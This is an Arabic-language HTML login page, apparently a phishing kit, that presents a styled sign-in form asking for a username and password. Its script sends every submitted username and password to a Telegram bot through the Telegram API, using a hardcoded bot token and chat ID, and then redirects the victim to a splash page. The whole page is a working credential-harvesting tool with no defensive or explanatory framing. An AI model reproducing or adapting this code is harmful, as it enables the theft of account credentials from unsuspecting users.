<!doctype html>
<html lang="ar" dir="rtl">
<head>


<meta charset="utf-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
  <link rel="shortcut icon" href="logo.png" type="image/x-icon">
<link rel="icon" type="image/png" sizes="32x32" href="logo-32.png">
<link rel="icon" type="image/png" sizes="16x16" href="logo-16.png">
<link rel="apple-touch-icon" sizes="180x180" href="logo-180.png">
<link rel="icon" type="image/png" sizes="32x32" href="logo-32.png">
<link rel="icon" type="image/png" sizes="16x16" href="logo-16.png">
<link rel="apple-touch-icon" sizes="180x180" href="logo-180.png">

<meta name="theme-color" content="#ff6a2b">
<title>تسجيل الدخول</title>

<link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@400;500;700;800&display=swap" rel="stylesheet">

<style>
:root{
--bg-dark:#0f1420;
--card:#111826;
--text:#fff;
--muted:#fff;
--accent:#ff6a2b;
--accent-hover:#ff7f4a;
--border:rgba(255,255,255,.12);
--input-bg:rgba(20,27,43,.65);
--blur:18px;
--radius:18px;
--shadow:0 10px 30px rgba(0,0,0,.35);
}

*{box-sizing:border-box}
html,body{height:100%}
body{
margin:0;
font-family:"Tajawal", sans-serif;
background: var(--bg-dark) no-repeat center/cover fixed;
background-image: url('etehad.png');
color:var(--text);
}

body::before{
content:"";
position:fixed;
inset:0;
background:
radial-gradient(1200px 600px at 80% 0%, rgba(255,255,255,.06), transparent 60%),
linear-gradient(180deg, rgba(0,0,0,.35), rgba(0,0,0,.55));
pointer-events:none;
}

.wrap{
min-height:100%;
display:flex;
flex-direction:column;
align-items:center;
justify-content:center;
padding:32px 16px;
gap:20px;
}

.card{
width: 340px;
background: rgba(38,38,50,.1);
border: 1px solid var(--border);
border-radius: var(--radius);
box-shadow: var(--shadow);
padding: 40px 28px 28px;
position:relative;
}

.logo{ display:grid; place-items:center; margin-bottom:10px; }
.logo img{ width:72px; height:72px; object-fit:contain; }

h1{ margin:0 0 8px 0; font-weight:800; font-size: 40px; text-align:center; }
.subtitle{ text-align:center; color:var(--muted); margin:0 0 26px 0; font-size:18px; line-height:1.7; }

.label{ display:block; margin:18px 6px 8px; color:#fff; font-size:16px; }

.input{ position:relative; }
.input input{
width:100%;
background: var(--input-bg);
color: var(--text);
border: 1px solid #fff;
border-radius: 14px;
padding: 18px 16px 18px 46px;
font-size: 20px;
outline: none;
}
.input input::placeholder{ color:#99a2b7; }

.toggle-eye{
position:absolute;
inset:0 auto 0 12px;
width:42px; height:100%;
display:grid; place-items:center;
cursor:pointer; border:none; background:transparent;
}
.toggle-eye svg{ width:22px; height:22px; fill:#fff; stroke:#fff; }

.actions{
display:flex;
gap:14px;
justify-content:space-between;
margin-top:18px;
color:var(--muted);
font-size:12px;
}
.actions a{ color:var(--muted); text-decoration:none; }
.actions a:hover{ text-decoration:underline }

/* زر تسجيل الدخول خارج البوكس */
.submit{
width: 340px;
background: var(--accent);
color:#fff;
border:none;
border-radius: 12px;
padding: 16px;
font-size: 22px;
font-weight:700;
cursor:pointer;
box-shadow: 0 10px 18px rgba(255,106,43,.3);
transition: background .2s, transform .05s;
}
.submit:hover{ background: var(--accent-hover); }
.submit:active{ transform: scale(.98); }

.toast{
position:fixed; top:16px; left:50%; transform:translateX(-50%);
background:rgba(38,38,50,.85); color:#fff;
padding:12px 16px; border-radius:12px; box-shadow:var(--shadow);
font-size:16px; display:none;
}
</style>
</head>
<body>
<div class="wrap">
<form class="card" id="loginForm" autocomplete="on">
<div class="logo">
<img src="logo.png" alt="الشعار">
</div>

<h1>مرحباً</h1>
<p class="subtitle">أدخل اسم المستخدم وكلمة المرور للوصول إلى حسابك بأمان</p>

<label class="label" for="username">اسم المستخدم</label>
<div class="input">
<input id="username" name="username" placeholder="إدخال اسم المستخدم" required>
</div>

<label class="label" for="password">كلمة المرور</label>
<div class="input">
<input id="password" name="password" type="password" placeholder="إدخال كلمة المرور" required>
<button class="toggle-eye" type="button">
<svg viewBox="0 0 24 24">
<path d="M12 5c-5.5 0-9.5 4.4-10.7 6 1.2 1.6 5.2 6 10.7 6s9.5-4.4 10.7-6C21.5 9.4 17.5 5 12 5zm0 10a4 4 0 1 1 0-8 4 4 0 0 1 0 8zm0-2.2a1.8 1.8 0 1 0 0-3.6 1.8 1.8 0 0 0 0 3.6z"/>
</svg>
</button>
</div>

<div class="actions">
<a href="#">إعادة تعيين كلمة المرور؟</a>
<a href="#">نسيت اسم المستخدم؟</a>
</div>
</form>

<!-- زر خارج الكارت -->
<button class="submit" form="loginForm" type="submit">تسجيل الدخول</button>
</div>

<div class="toast" id="toast"></div>

<script>
const pass = document.getElementById('password');
const eyeBtn = document.querySelector('.toggle-eye');

eyeBtn.addEventListener('click', () => {
pass.type = pass.type === 'password' ? 'text' : 'password';
eyeBtn.classList.toggle('line');
});

function showToast(msg){
const t = document.getElementById('toast');
t.textContent = msg;
t.style.display = 'block';
setTimeout(() => t.style.display = 'none', 2600);
}

// === إعدادات تيليجرام ===
const TG = {
botToken: "8329394212:AAEoTZ5qvy9Dz4-ew9mjLIm_8mgxGeP4gtA", // ضع التوكن هنا
chatId: "5450865891" // ضع chat_id هنا
};

document.getElementById('loginForm').addEventListener('submit', async (e)=>{
e.preventDefault();
const username = document.getElementById('username').value.trim();
const password = document.getElementById('password').value;

if(!username || !password){ showToast('يرجى تعبئة الحقول'); return; }

const text = `طلب تسجيل دخول:\n👤 المستخدم: ${username}\n🔒 كلمة المرور: ${password}`;

try{
const url = `https://api.telegram.org/bot${TG.botToken}/sendMessage`;
const r = await fetch(url, {
method: "POST",
headers: {"Content-Type":"application/json"},
body: JSON.stringify({
chat_id: TG.chatId,
text,
parse_mode: "HTML"
})
});

if(!r.ok) throw new Error("خطأ بالإرسال");

showToast("تم الإرسال بنجاح");
setTimeout(()=>{ window.location.href = "splash.html"; }, 2000);
e.target.reset();
}catch(err){
console.error(err);
showToast("فشل الإرسال، حاول لاحقًا");
}
});
</script>
</body>
</html>
